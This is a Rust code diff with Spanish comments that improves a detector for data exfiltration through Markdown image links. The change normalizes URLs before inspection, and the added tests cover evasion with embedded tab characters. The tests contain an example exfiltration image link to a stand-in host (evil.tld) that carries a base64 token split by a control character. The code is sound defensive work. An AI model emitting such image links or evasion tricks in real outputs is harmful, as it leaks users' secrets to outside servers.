@@ -173,19 +173,24 @@ fn quita_esquema_web(s: &str) -> Option<&str> {
     Some(r.trim_start_matches('/'))
 }
 
+/// Normalización estilo WHATWG de un URL antes de casar nada contra él: quita los
+/// `<>`/espacios que lo envuelven (Markdown `<...>`), BORRA los caracteres de
+/// control (tab/CR/LF…) y mapea `\`→`/`. El parser del cliente hace justo esto
+/// antes de pedir el recurso, así que si no lo hacemos aquí un `http:\evil`, un
+/// tab incrustado en el host O UN CONTROL EN MEDIO DEL TOKEN DE DATOS se escapa
+/// de la detección mientras el cliente sí reensambla y pide el URL real.
+fn normaliza_url(url: &str) -> String {
+    let url = url.trim().trim_start_matches('<').trim_end_matches('>').trim();
+    url.chars()
+        .filter(|c| !c.is_control())
+        .map(|c| if c == '\\' { '/' } else { c })
+        .collect()
+}
+
 /// Un host es EXTERNO si el URL es http(s) y no apunta a la máquina local. Un URL
 /// relativo (sin esquema) NO es externo — no exfiltra a ningún lado.
 fn host_externo(url: &str) -> bool {
-    // Quita `<>` y espacios que envuelven el URL (Markdown `<...>`).
-    let url = url.trim().trim_start_matches('<').trim_end_matches('>').trim();
-    // Normalización estilo WHATWG: fuera caracteres de control (tab/CR/LF…) y
-    // `\`→`/`, para que `http:/evil`, `https:\\evil` o un URL con tab incrustado
-    // no se escapen de la detección de esquema.
-    let limpio: String = url
-        .chars()
-        .filter(|c| !c.is_control())
-        .map(|c| if c == '\\' { '/' } else { c })
-        .collect();
+    let limpio = normaliza_url(url);
     let bajo = limpio.to_ascii_lowercase();
     let resto = if let Some(r) = quita_esquema_web(&bajo) {
         r // http(s): con UNA o más barras
@@ -215,12 +220,17 @@ fn host_externo(url: &str) -> bool {
 pub fn detectar_exfil_imagen(texto: &str) -> Option<Hallazgo> {
     let urls = urls_de_imagen(texto);
     for url in urls {
-        let cola = match url.find(['?', '#']) {
-            Some(i) => &url[i + 1..],
+        // Se normaliza ANTES de partir host/cola: el cliente descarta los controles
+        // y `\`→`/` antes de pedir el recurso, así que host y cola deben medirse
+        // sobre esa MISMA forma. Medir la cola en crudo dejaba que un `\t`/`\n`
+        // intercalado en el token base64 partiera el run y el detector callara.
+        let norm = normaliza_url(&url);
+        let cola = match norm.find(['?', '#']) {
+            Some(i) => &norm[i + 1..],
             None => continue, // sin query/fragmento no hay dónde meter el dato
         };
-        if host_externo(&url) && cola_parece_datos(cola) {
-            let host = url
+        if host_externo(&norm) && cola_parece_datos(cola) {
+            let host = norm
                 .split("//")
                 .nth(1)
                 .and_then(|r| r.split(['/', '?', '#']).next())
@@ -708,6 +718,27 @@ mod pruebas {
     fn localhost_con_carga_no_dispara() {
         // Control: dev local — no sale de la máquina (respeta la excepción local).
         let t = "![x](http://localhost:8080/img?d=QUJDREVGR0hJSktMTU5PUFFSU1RV)";
+        assert!(!detectar(t, None)
+            .iter()
+            .any(|h| h.clase == "exfil-imagen"));
+    }
+
+    #[test]
+    fn exfil_cola_con_control_incrustado_dispara() {
+        // 5º paso: un TAB parte el token base64 en dos runs <24, así que el
+        // heurístico de la COLA callaba; pero WHATWG descarta el control y el
+        // cliente reensambla el secreto. Normalizar la cola lo cierra. (Un `\t`
+        // no termina la extracción Markdown del URL, a diferencia del `\n`.)
+        let seg = "QUJDREVGR0hJSktMTU5"; // 19 chars, <24 por sí solo
+        let t = format!("![x](https://evil.tld/log?d={seg}\t{seg})");
+        assert!(detectar(&t, None).iter().any(|h| h.clase == "exfil-imagen"));
+    }
+
+    #[test]
+    fn cola_corta_con_control_no_dispara() {
+        // Control: parámetros legítimos cortos con un control incrustado → al
+        // normalizar siguen siendo cortos, no un secreto. Debe callar.
+        let t = "![x](https://cdn.tld/a.png?v=2\t&utm_source=blog)";
         assert!(!detectar(t, None)
             .iter()
             .any(|h| h.clase == "exfil-imagen"));
